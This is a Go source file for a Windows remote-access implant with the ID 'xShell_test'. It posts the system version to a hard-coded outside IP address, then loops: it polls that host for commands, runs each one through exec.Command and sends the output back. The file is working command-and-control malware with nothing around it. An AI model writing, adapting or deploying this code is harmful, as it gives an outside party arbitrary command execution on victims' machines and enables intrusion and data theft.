package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const shellID = "xShell_test"

func executeCommand(command string) string {
	if command == "" {
		return ""
	}

	if command == "quit" {
		os.Exit(0)
	}

	cmd := strings.Fields(command)
	head := cmd[0]
	parts := cmd[1:len(cmd)]

	out, err := exec.Command(head, parts...).Output()
	if err != nil {
		return fmt.Sprintf("Command execution failed: %v", err)
	}

	return string(out)
}

func getWindowsVersion() string {
	out, err := exec.Command("cmd", "/C", "ver").Output()
	if err != nil {
		return fmt.Sprintf("Failed to get Windows version: %v", err)
	}
	return string(out)
}

func main() {
	version := getWindowsVersion()
	if version != "" {
		_, err := http.Post(fmt.Sprintf("http://99.153.7.181/result?id=%s", shellID), "text/plain", strings.NewReader(version))
		if err != nil {
			fmt.Printf("Failed to post version: %v\n", err)
			time.Sleep(5 * time.Second)
		}
	}

	for {
		resp, err := http.Get(fmt.Sprintf("http://99.153.7.181/command?id=%s", shellID))
		if err != nil {
			fmt.Printf("Failed to fetch command: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		body, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("Failed to read command body: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		result := executeCommand(string(body))
		if result != "" {
			_, err = http.Post(fmt.Sprintf("http://99.153.7.181/result?id=%s", shellID), "text/plain", strings.NewReader(result))
			if err != nil {
				fmt.Printf("Failed to post result: %v\n", err)
				time.Sleep(5 * time.Second)
			}
		}
	}
}
